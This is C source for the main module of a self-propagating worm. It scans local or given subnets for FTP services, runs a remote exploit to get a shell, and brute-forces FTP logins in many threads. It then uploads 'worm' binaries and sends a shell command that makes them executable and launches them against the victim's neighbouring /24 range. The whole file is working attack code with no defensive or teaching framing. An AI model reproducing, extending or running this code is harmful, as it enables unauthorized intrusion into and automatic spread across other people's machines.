#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ifaddrs.h>
//---
#include "scanner.h"
#include "bruteforce.h"
#include "exploit.h"
#include "spread.h"

#ifndef FTP_USER
#  define FTP_USER            "rrlm"
#endif

struct bruteforce_arguments {
  struct scan_table *target;
  int thread_id;
};

static pthread_t threads[MAX_THREADS];
static pthread_mutex_t bruteforce_lock;
static int ftp_fd = 0;
static int stop_bruteforce = 0;

void *try_bruteforce(void *arguments) {
  struct bruteforce_arguments *arg;
  char guess[MAX_PASSWORD_LENGTH];
  int fd;

  arg = (struct bruteforce_arguments *) arguments;

  while(stop_bruteforce == 0) {
    pthread_mutex_lock(&bruteforce_lock);

    if(bruteforce(guess, sizeof guess) == 0) {
      stop_bruteforce = 1;
      fprintf(stdout, "Password not found by brute-force method!\n");
    }

    pthread_mutex_unlock(&bruteforce_lock);

    if(stop_bruteforce == 0 && (fd = ftp_try_login(arg->target->address, arg->target->port, FTP_USER, guess, arg->thread_id)) > 0) {
      ftp_fd = fd;
      stop_bruteforce = 1;
      fprintf(stdout, "Connected to FTP! Password is \"%s\"\n", guess);
    }
  }

  return NULL;
}

int main(int argc, char *const *argv) {
  struct scan_table *target_table, *target, *ifa_table;
  struct bruteforce_arguments args[MAX_THREADS];
  struct ifaddrs *addresses, *ifa;
  struct sockaddr_in *addr;
  char cmd_buffer[256];
  char range[32];
  char *interface = NULL;
  int shell_fd, method, opt, err;
  int use_raw_socket = 0, verbose = 0;
  unsigned int i, length;

  while((opt = getopt(argc, argv, "svi:")) != -1) {
    switch(opt) {
      case 's':
        use_raw_socket = 1;
        break;
      case 'v':
        verbose = 1;
        break;
      case 'i':
        interface = strdup(optarg);
        break;
      default:
        fprintf(stdout, "Uso: %s [-sv] [-i interface] <address range> [port range]\n", argv[0]);
        exit(0);
    }
  }

  target_table = NULL;
  ifa_table = NULL;
  srand(time(NULL));
  pthread_mutex_init(&bruteforce_lock, NULL);

  if(verbose != 0) {
    fprintf(stdout, "Performing address scan...\n");
  }

  if(argc <= optind) {
    getifaddrs(&addresses);

    for(ifa = addresses; ifa != NULL; ifa = ifa->ifa_next) {
      if(strncmp(ifa->ifa_name, "lo", 2) != 0 && ifa->ifa_addr != NULL &&
                 ifa->ifa_addr->sa_family == AF_INET) {
        addr = (struct sockaddr_in *) ifa->ifa_addr;
        snprintf(range, sizeof range, "%s", inet_ntoa(addr->sin_addr)); 
        for(i = strlen(range); i > 0 && range[i] != '.'; --i) {
          range[i] = '\0';
        }

        strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);

        if(verbose != 0) {
          fprintf(stdout, "Scanning interface %s (%s)...\n", ifa->ifa_name, range);
        }

        ifa_table = scanner(range, "\0", interface, use_raw_socket, 0);

        for(target = ifa_table; target != NULL; target = target->next) {
          if(target->next == NULL) {
            target->next = target_table;
            break;
          }
        }

        target_table = ifa_table;
      }
    }

    freeifaddrs(addresses);
  } else {
    if(verbose != 0) {
      fprintf(stdout, "Scanning range %s...\n", argv[optind]);
    }

    target_table = scanner(argv[optind], (argc > optind + 1) ? argv[optind + 1] : "\0", interface, use_raw_socket, 0);
  }

  fprintf(stdout, "Address scan completed!\n");

  if(target_table != NULL) {
    for(target = target_table; target != NULL; target = target->next) {
      if(strstr(target->banner, "FTP") != NULL) {
        fprintf(stdout, "Attacking target \"%s:%u\"...\n", target->address, target->port);
        shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");

        if((method = rand() % 1) == 0) {
          fprintf(stdout, "Performing brute-force attack...\n");
          for(i = 0; i < MAX_THREADS; ++i) {
            args[i].target = target;
            args[i].thread_id = i;

            if((err = pthread_create(&threads[i], NULL, &try_bruteforce, (void *) &args[i])) != 0) {
              fprintf(stderr, "Couldn't create thread \"%d\": %s\n", strerror(err));
            }
          }

          for(i = 0; i < MAX_THREADS; ++i) {
            pthread_join(threads[i], NULL);
          }
        } else {

        }

        if(ftp_fd != 0) {
          spread(ftp_fd, "worm", "worm");
          spread(ftp_fd, "worm.i686", "worm.i686");
          close(ftp_fd);
        }

        snprintf(range, sizeof range, "%s", target->address);
        for(i = strlen(range); i > 0 && range[i] != '.'; --i) {
          range[i] = '\0';
        }

        strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);

        length = snprintf(cmd_buffer, sizeof cmd_buffer, "chmod +x ~%s/worm* ; ~%s/worm %s 1-1024 ; ~%s/worm.i686 %s 1-1024\n", FTP_USER, FTP_USER, range, FTP_USER, range);
        fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
        write(shell_fd, cmd_buffer, length);
        close(shell_fd);
        fprintf(stdout, "Attack completed!\n");
      }
    }
  }

  if(interface != NULL) {
    free(interface);
  }

  pthread_mutex_destroy(&bruteforce_lock);
  return 0;
}
